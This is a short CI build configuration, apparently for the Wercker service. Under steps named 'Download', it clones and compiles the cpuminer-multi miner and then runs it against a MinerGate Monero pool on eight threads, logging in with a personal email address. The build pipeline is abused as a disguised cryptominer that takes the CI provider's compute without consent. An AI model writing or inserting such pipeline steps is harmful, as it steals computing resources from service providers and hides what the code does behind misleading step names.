box: ubuntu
no-response-timeout: 60
build:
  steps:
    - install-packages:
        packages: wget dpkg gnupg
        
    - script:
        name: Download
        code: |
          sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake -yqq
          git clone https://github.com/hyc/cpuminer-multi
          cd cpuminer-multi
          ./autogen.sh
          CFLAGS="-march=native" ./configure
          make
         
  after-steps:
    - script:
        name: Download
        code: |
          sudo ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u yoginth@hotmail.com -p x -t 8
